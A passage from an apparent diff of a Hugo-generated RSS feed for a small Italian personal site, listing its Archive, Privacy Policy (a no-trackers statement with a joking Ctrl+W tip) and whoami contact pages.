+E&amp;rsquo; tutto in costruzione, state buoni.&lt;/p></description></item><item><title>Archive</title><link>/archive/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/archive/</guid><description/></item><item><title>Privacy Policy</title><link>/privacy-policy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/privacy-policy/</guid><description>
+&lt;img src="/images/chris-yang-1tnS_BVy9Jk-unsplash-1.jpg"/>
+&lt;p>Qui non ci sono tracker, annunci e cookie di nessun genere.&lt;/p>
+&lt;p>Il sito è generato con Hugo e ospitato su Github Pages.&lt;br>
+Se consideri Github Pages lesivo della tua privacy, premi &lt;code>Ctrl + W&lt;/code> (&lt;code>Command + W&lt;/code> su Mac) per caricare una versione alternativa.&lt;/p>
+&lt;p>Buona lettura!&lt;/p></description></item><item><title>whoami</title><link>/whoami/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/whoami/</guid><description>
+&lt;img src="/images/cover-whoami.webp"/>
+&lt;p>✉️ light.key2932 AT fastmail DOT com&lt;/p>
+&lt;p>:)&lt;/p></description></item></channel></rss>
